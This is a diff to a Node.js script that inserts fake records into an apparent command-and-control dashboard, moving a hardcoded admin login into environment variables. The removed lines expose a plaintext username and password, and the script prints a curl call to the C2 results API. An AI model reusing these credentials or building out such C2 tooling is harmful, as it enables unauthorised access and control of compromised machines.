@@ -1,7 +1,9 @@
 const fetch = require('node-fetch');
 
 const C2_SERVER = 'https://skinforge.pro';
-const ADMIN_TOKEN = 'd2VzdDpJbG92ZWpvc2h1YQ=='; // Base64 encoded "west:Ilovejoshua"
+const ADMIN_USER = process.env.ADMIN_USER;
+const ADMIN_PASS = process.env.ADMIN_PASS;
+const ADMIN_TOKEN = Buffer.from(`${ADMIN_USER}:${ADMIN_PASS}`).toString('base64');
 
 async function insertFakeData() {
     console.log('🚀 Inserting fake C2 data for dashboard testing...\n');
@@ -179,7 +181,7 @@ Wireless LAN adapter Wi-Fi:
         console.log('- 6 commands created');
         console.log('- 6 results submitted');
         console.log('\n🌐 You can now view the data in your C2 dashboard:');
-        console.log('https://skinforge.pro/admin (login with west/Ilovejoshua)');
+        console.log(`https://skinforge.pro/admin (login with ${ADMIN_USER}/${ADMIN_PASS})`);
         console.log('\n🔍 Or check the API directly:');
         console.log(`curl -H "Authorization: Bearer ${ADMIN_TOKEN}" ${C2_SERVER}/api/admin/c2/results`);
 
